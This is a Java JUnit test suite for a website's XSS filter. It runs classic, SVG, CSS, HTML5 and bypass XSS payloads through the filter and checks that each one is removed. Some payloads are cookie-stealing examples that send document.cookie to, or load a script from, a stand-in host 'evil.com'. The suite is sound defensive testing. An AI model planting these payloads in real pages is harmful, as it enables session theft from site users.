package com.myweb.website_core.security;

import com.myweb.website_core.application.service.security.XssMonitoringService;
import com.myweb.website_core.application.service.security.XssStatisticsService;
import com.myweb.website_core.infrastructure.config.XssFilterConfig;
import com.myweb.website_core.infrastructure.security.filter.XssFilterService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.MethodSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

/**
 * XSS攻击场景测试
 * <p>
 * 专门测试各种真实的XSS攻击场景，验证防护效果。
 * 包含OWASP Top 10中的XSS攻击向量和实际攻击案例。
 * <p>
 * 测试场景：
 * 1. 反射型XSS攻击
 * 2. 存储型XSS攻击
 * 3. DOM型XSS攻击
 * 4. 绕过尝试攻击
 * 5. 编码攻击
 * 6. 多重编码攻击
 * <p>
 * 符合需求：2.1, 2.2, 2.5 - XSS攻击场景测试
 * 
 * @author MyWeb
 * @version 1.0
 * @since 2025-01-01
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("XSS攻击场景测试")
class XssAttackScenarioTest {
    
    @Mock
    private XssFilterConfig xssFilterConfig;
    
    @Mock
    private XssStatisticsService xssStatisticsService;
    
    @Mock
    private XssMonitoringService xssMonitoringService;
    
    @Mock
    private XssFilterConfig.PerformanceConfig performanceConfig;
    
    @Mock
    private XssFilterConfig.StatisticsConfig statisticsConfig;
    
    @Mock
    private XssFilterConfig.MonitoringConfig monitoringConfig;
    
    private XssFilterService xssFilter;
    
    private static final String TEST_CLIENT_IP = "10.0.0.1";
    private static final String TEST_REQUEST_URI = "/api/posts";
    
    @BeforeEach
    void setUp() {
        setupConfiguration();
        xssFilter = new XssFilterService(xssFilterConfig, xssStatisticsService, xssMonitoringService);
    }
    
    private void setupConfiguration() {
        when(xssFilterConfig.isEnabled()).thenReturn(true);
        when(xssFilterConfig.isStrictMode()).thenReturn(false);
        when(xssFilterConfig.getAllowedTags()).thenReturn(Set.of("b", "i", "u", "strong", "em", "p", "br", "a", "img"));
        when(xssFilterConfig.getAllowedAttributes()).thenReturn(Set.of("href", "src", "alt", "title", "class"));
        when(xssFilterConfig.getTagSpecificAttributes()).thenReturn(Map.of(
            "a", Set.of("href", "title", "target"),
            "img", Set.of("src", "alt", "title", "width", "height")
        ));
        when(xssFilterConfig.isRemoveUnknownTags()).thenReturn(true);
        when(xssFilterConfig.isEncodeSpecialChars()).thenReturn(true);
        when(xssFilterConfig.getMaxTagDepth()).thenReturn(10);
        when(xssFilterConfig.getMaxContentLength()).thenReturn(50000);
        when(xssFilterConfig.getCustomXssPatterns()).thenReturn(List.of());
        when(xssFilterConfig.getWhitelistUrlPatterns()).thenReturn(List.of());
        
        when(xssFilterConfig.getPerformance()).thenReturn(performanceConfig);
        when(performanceConfig.isCacheEnabled()).thenReturn(true);
        when(performanceConfig.getCacheSize()).thenReturn(1000);
        when(performanceConfig.getCacheExpirationMinutes()).thenReturn(30);
        
        when(xssFilterConfig.getStatistics()).thenReturn(statisticsConfig);
        when(statisticsConfig.isEnabled()).thenReturn(true);
        
        when(xssFilterConfig.getMonitoring()).thenReturn(monitoringConfig);
        when(monitoringConfig.isEnabled()).thenReturn(true);
    }
    
    @Test
    @DisplayName("测试经典脚本注入攻击")
    void testClassicScriptInjectionAttacks() {
        // Given - 经典的脚本注入攻击向量
        String[] attacks = {
            "<script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>window.location='http://evil.com?cookie='+document.cookie</script>",
            "<script src=\"http://evil.com/xss.js\"></script>",
            "<script language=\"javascript\">alert('XSS')</script>",
            "<script type=\"text/javascript\">alert('XSS')</script>"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("<script"), "脚本标签应被移除: " + attack);
            assertFalse(result.contains("alert"), "脚本内容应被移除: " + attack);
            assertFalse(result.contains("document.cookie"), "敏感API调用应被移除: " + attack);
        }
        
        verify(xssStatisticsService, atLeast(attacks.length))
            .recordXssAttack(eq(TEST_CLIENT_IP), eq(TEST_REQUEST_URI), eq("script_injection"), isNull());
    }
    
    @Test
    @DisplayName("测试图片标签XSS攻击")
    void testImageTagXssAttacks() {
        // Given - 图片标签相关的XSS攻击
        String[] attacks = {
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<img src=\"javascript:alert('XSS')\">",
            "<img src=\"x\" onerror=\"document.location='http://evil.com'\">",
            "<img src=\"x\" onload=\"alert('XSS')\">",
            "<img src=\"x\" onmouseover=\"alert('XSS')\">",
            "<img src=\"data:text/html,<script>alert('XSS')</script>\">",
            "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">", // base64编码的alert('XSS');
            "<img/src=\"x\"/onerror=\"alert('XSS')\">"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("onerror"), "onerror事件应被移除: " + attack);
            assertFalse(result.contains("onload"), "onload事件应被移除: " + attack);
            assertFalse(result.contains("onmouseover"), "onmouseover事件应被移除: " + attack);
            assertFalse(result.contains("javascript:"), "JavaScript协议应被阻止: " + attack);
            assertFalse(result.contains("alert"), "脚本内容应被移除: " + attack);
        }
    }
    
    @Test
    @DisplayName("测试链接标签XSS攻击")
    void testLinkTagXssAttacks() {
        // Given - 链接标签相关的XSS攻击
        String[] attacks = {
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<a href=\"javascript:void(0)\" onclick=\"alert('XSS')\">Click me</a>",
            "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click me</a>",
            "<a href=\"vbscript:alert('XSS')\">Click me</a>",
            "<a href=\"#\" onmouseover=\"alert('XSS')\">Hover me</a>",
            "<a href=\"http://evil.com\" onclick=\"alert(document.cookie)\">Link</a>"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("javascript:"), "JavaScript协议应被阻止: " + attack);
            assertFalse(result.contains("vbscript:"), "VBScript协议应被阻止: " + attack);
            assertFalse(result.contains("onclick"), "onclick事件应被移除: " + attack);
            assertFalse(result.contains("onmouseover"), "onmouseover事件应被移除: " + attack);
            assertFalse(result.contains("alert"), "脚本内容应被移除: " + attack);
        }
    }
    
    @Test
    @DisplayName("测试表单相关XSS攻击")
    void testFormRelatedXssAttacks() {
        // Given - 表单相关的XSS攻击
        String[] attacks = {
            "<form action=\"javascript:alert('XSS')\">",
            "<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>",
            "<input type=\"button\" onclick=\"alert('XSS')\" value=\"Click\">",
            "<textarea onfocus=\"alert('XSS')\" autofocus></textarea>",
            "<select onfocus=\"alert('XSS')\" autofocus><option>test</option></select>",
            "<button onclick=\"alert('XSS')\">Click me</button>"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("javascript:"), "JavaScript协议应被阻止: " + attack);
            assertFalse(result.contains("onfocus"), "onfocus事件应被移除: " + attack);
            assertFalse(result.contains("onclick"), "onclick事件应被移除: " + attack);
            assertFalse(result.contains("alert"), "脚本内容应被移除: " + attack);
        }
    }
    
    @Test
    @DisplayName("测试CSS样式XSS攻击")
    void testCssStyleXssAttacks() {
        // Given - CSS样式相关的XSS攻击
        String[] attacks = {
            "<div style=\"background: expression(alert('XSS'))\">Text</div>",
            "<p style=\"background: url('javascript:alert(1)')\">Text</p>",
            "<span style=\"color: expression(document.cookie)\">Text</span>",
            "<div style=\"width: expression(alert('XSS'))\">Text</div>",
            "<style>body{background: url('javascript:alert(1)')}</style>",
            "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
            "<div style=\"background: url(data:text/html,<script>alert('XSS')</script>)\">Text</div>"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("expression("), "CSS表达式应被移除: " + attack);
            assertFalse(result.contains("javascript:"), "JavaScript协议应被阻止: " + attack);
            assertFalse(result.contains("<style"), "style标签应被移除: " + attack);
            assertFalse(result.contains("<link"), "link标签应被移除: " + attack);
        }
    }
    
    @Test
    @DisplayName("测试SVG相关XSS攻击")
    void testSvgRelatedXssAttacks() {
        // Given - SVG相关的XSS攻击
        String[] attacks = {
            "<svg onload=\"alert('XSS')\">",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><g onload=\"alert('XSS')\"></g></svg>",
            "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
            "<svg><use onload=\"alert('XSS')\"></use></svg>",
            "<svg><animate onbegin=\"alert('XSS')\"></animate></svg>"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("<svg"), "SVG标签应被移除: " + attack);
            assertFalse(result.contains("onload"), "onload事件应被移除: " + attack);
            assertFalse(result.contains("onbegin"), "onbegin事件应被移除: " + attack);
            assertFalse(result.contains("alert"), "脚本内容应被移除: " + attack);
        }
    }
    
    @Test
    @DisplayName("测试HTML5新标签XSS攻击")
    void testHtml5NewTagXssAttacks() {
        // Given - HTML5新标签相关的XSS攻击
        String[] attacks = {
            "<video onloadstart=\"alert('XSS')\">",
            "<audio onloadstart=\"alert('XSS')\">",
            "<canvas onclick=\"alert('XSS')\">",
            "<details ontoggle=\"alert('XSS')\">",
            "<summary onclick=\"alert('XSS')\">",
            "<source onerror=\"alert('XSS')\">",
            "<track onerror=\"alert('XSS')\">",
            "<progress onclick=\"alert('XSS')\">",
            "<meter onclick=\"alert('XSS')\">",
            "<dialog onclose=\"alert('XSS')\">"
        };
        
        for (String attack : attacks) {
            // When
            String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            assertFalse(result.contains("onloadstart"), "onloadstart事件应被移除: " + attack);
            assertFalse(result.contains("ontoggle"), "ontoggle事件应被移除: " + attack);
            assertFalse(result.contains("onclose"), "onclose事件应被移除: " + attack);
            assertFalse(result.contains("alert"), "脚本内容应被移除: " + attack);
        }
    }
    
    @ParameterizedTest
    @CsvSource({
        "'<script>alert(1)</script>', 'script_injection'",
        "'<img onerror=alert(1) src=x>', 'event_handler'",
        "'<a href=\"javascript:alert(1)\">link</a>', 'javascript_protocol'",
        "'<iframe src=\"evil.html\"></iframe>', 'frame_injection'",
        "'<div style=\"expression(alert(1))\">text</div>', 'css_expression'"
    })
    @DisplayName("测试攻击类型检测")
    void testAttackTypeDetection(String attack, String expectedType) {
        // When
        String result = xssFilter.filterXss(attack, TEST_REQUEST_URI, TEST_CLIENT_IP);
        
        // Then
        assertNotEquals(attack, result, "攻击内容应被过滤");
        verify(xssStatisticsService)
            .recordXssAttack(eq(TEST_CLIENT_IP), eq(TEST_REQUEST_URI), eq(expectedType), isNull());
    }
    
    @ParameterizedTest
    @MethodSource("provideBypassAttempts")
    @DisplayName("测试绕过尝试防护")
    void testBypassAttemptProtection(String bypassAttempt) {
        // When
        String result = xssFilter.filterXss(bypassAttempt, TEST_REQUEST_URI, TEST_CLIENT_IP);
        
        // Then
        assertFalse(result.contains("alert"), "绕过尝试应被阻止: " + bypassAttempt);
        assertFalse(result.contains("javascript:"), "JavaScript协议应被阻止: " + bypassAttempt);
        assertFalse(result.contains("<script"), "脚本标签应被移除: " + bypassAttempt);
    }
    
    static Stream<String> provideBypassAttempts() {
        return Stream.of(
            // 大小写绕过尝试
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<IMG SRC=\"javascript:alert('XSS')\">",
            
            // 空格和换行绕过尝试
            "<script >alert('XSS')</script>",
            "<script\n>alert('XSS')</script>",
            "<script\t>alert('XSS')</script>",
            
            // 属性分隔绕过尝试
            "<img/src=\"x\"/onerror=\"alert('XSS')\">",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            
            // 编码绕过尝试
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">",
            
            // 注释绕过尝试
            "<script>/**/alert('XSS')</script>",
            "<script>alert('XSS')//</script>",
            
            // 多重标签绕过尝试
            "<script><script>alert('XSS')</script></script>",
            "<img><img src=\"x\" onerror=\"alert('XSS')\">",
            
            // 特殊字符绕过尝试
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",
            "<script>alert(`XSS`)</script>"
        );
    }
    
    @Test
    @DisplayName("测试复杂混合攻击场景")
    void testComplexMixedAttackScenario() {
        // Given - 复杂的混合攻击场景
        String complexAttack = """
            <div>正常内容开始</div>
            <script>alert('XSS1')</script>
            <p>中间的正常段落</p>
            <img src="x" onerror="alert('XSS2')">
            <a href="javascript:alert('XSS3')">恶意链接</a>
            <div style="background: expression(alert('XSS4'))">样式攻击</div>
            <iframe src="http://evil.com/xss.html"></iframe>
            <svg onload="alert('XSS5')"></svg>
            <div>正常内容结束</div>
            """;
        
        // When
        String result = xssFilter.filterXss(complexAttack, TEST_REQUEST_URI, TEST_CLIENT_IP);
        
        // Then - 验证正常内容保留
        assertTrue(result.contains("<div>正常内容开始</div>"), "正常内容应保留");
        assertTrue(result.contains("<p>中间的正常段落</p>"), "正常段落应保留");
        assertTrue(result.contains("<div>正常内容结束</div>"), "正常内容应保留");
        
        // 验证攻击内容被移除
        assertFalse(result.contains("<script>"), "脚本标签应被移除");
        assertFalse(result.contains("onerror"), "事件处理器应被移除");
        assertFalse(result.contains("javascript:"), "JavaScript协议应被阻止");
        assertFalse(result.contains("expression("), "CSS表达式应被移除");
        assertFalse(result.contains("<iframe"), "iframe标签应被移除");
        assertFalse(result.contains("<svg"), "SVG标签应被移除");
        assertFalse(result.contains("alert"), "所有脚本内容应被移除");
        
        // 验证攻击统计记录
        verify(xssStatisticsService, atLeast(1))
            .recordXssAttack(eq(TEST_CLIENT_IP), eq(TEST_REQUEST_URI), anyString(), isNull());
    }
    
    @Test
    @DisplayName("测试真实博客内容安全性")
    void testRealBlogContentSafety() {
        // Given - 真实的博客内容（包含一些潜在的攻击向量）
        String blogContent = """
            <h2>技术文章：JavaScript安全编程</h2>
            <p>在现代Web开发中，<strong>安全性</strong>是一个重要话题。</p>
            <p>以下是一些常见的安全问题：</p>
            <ul>
                <li>XSS攻击：如 &lt;script&gt;alert('XSS')&lt;/script&gt;</li>
                <li>SQL注入：如 ' OR 1=1 --</li>
                <li>CSRF攻击</li>
            </ul>
            <p>代码示例：</p>
            <pre><code>
            // 安全的代码
            function sanitizeInput(input) {
                return input.replace(/</g, '&lt;').replace(/>/g, '&gt;');
            }
            </code></pre>
            <p>更多信息请访问：<a href="https://owasp.org" title="OWASP官网">OWASP官网</a></p>
            <img src="/images/security.jpg" alt="安全图片" width="500" height="300">
            """;
        
        // When
        String result = xssFilter.filterXss(blogContent, TEST_REQUEST_URI, TEST_CLIENT_IP);
        
        // Then - 验证内容结构完整
        assertTrue(result.contains("<p>"), "段落应保留");
        assertTrue(result.contains("<strong>"), "强调标签应保留");
        assertTrue(result.contains("<ul>"), "列表应保留");
        assertTrue(result.contains("<li>"), "列表项应保留");
        assertTrue(result.contains("<a href="), "链接应保留");
        assertTrue(result.contains("<img src="), "图片应保留");
        
        // 验证已编码的内容保持不变
        assertTrue(result.contains("&lt;script&gt;"), "已编码的脚本标签应保持不变");
        assertTrue(result.contains("&lt;/script&gt;"), "已编码的结束标签应保持不变");
        
        // 验证没有误报攻击
        verify(xssStatisticsService, never())
            .recordXssAttack(any(), any(), any(), any());
    }
    
    @Test
    @DisplayName("测试用户评论内容安全性")
    void testUserCommentContentSafety() {
        // Given - 用户评论内容（可能包含攻击）
        String[] comments = {
            "这是一个正常的评论，感谢分享！",
            "很好的文章，<b>强烈推荐</b>！",
            "链接分享：<a href=\"https://example.com\">相关资源</a>",
            "恶意评论：<script>alert('steal cookies')</script>",
            "图片攻击：<img src=\"x\" onerror=\"location.href='http://evil.com'\">",
            "混合内容：正常文字 <script>alert('XSS')</script> 更多正常文字"
        };
        
        for (String comment : comments) {
            // When
            String result = xssFilter.filterXss(comment, TEST_REQUEST_URI, TEST_CLIENT_IP);
            
            // Then
            if (comment.contains("<script>") || comment.contains("onerror")) {
                // 恶意评论应被过滤
                assertFalse(result.contains("<script>"), "恶意脚本应被移除: " + comment);
                assertFalse(result.contains("onerror"), "事件处理器应被移除: " + comment);
                assertFalse(result.contains("alert"), "脚本内容应被移除: " + comment);
            } else {
                // 正常评论应保持基本结构
                if (comment.contains("<b>")) {
                    assertTrue(result.contains("<b>"), "正常标签应保留: " + comment);
                }
                if (comment.contains("<a href=")) {
                    assertTrue(result.contains("<a href="), "正常链接应保留: " + comment);
                }
            }
        }
    }
}